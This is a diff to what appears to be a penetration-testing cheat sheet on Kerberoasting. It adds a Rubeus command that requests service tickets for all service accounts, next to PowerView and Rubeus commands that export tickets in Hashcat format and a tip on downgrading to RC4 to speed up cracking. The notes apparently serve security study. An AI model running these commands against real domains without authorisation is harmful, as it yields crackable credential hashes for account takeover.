@@ -53,6 +53,11 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv <filena
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 ```
 
+-Using Rubeus to get a all TGS Ticket:
+```
+.\Rubeus.exe kerberoast /nowrap
+```
+
 Note: For the last 2 technique, we can also add /tgtdelag if the DC is below Microsoft Windows Server 2019, as before this version if we claims we only support RC4 encryption then the server will proceed to give us tickets encrypted in RC4, which reduce our time to crack significantly
 
 Note2: If for any reason, we require to do manual kerberoasting via setspn, refer to https://academy.hackthebox.com/app/module/143/section/1423
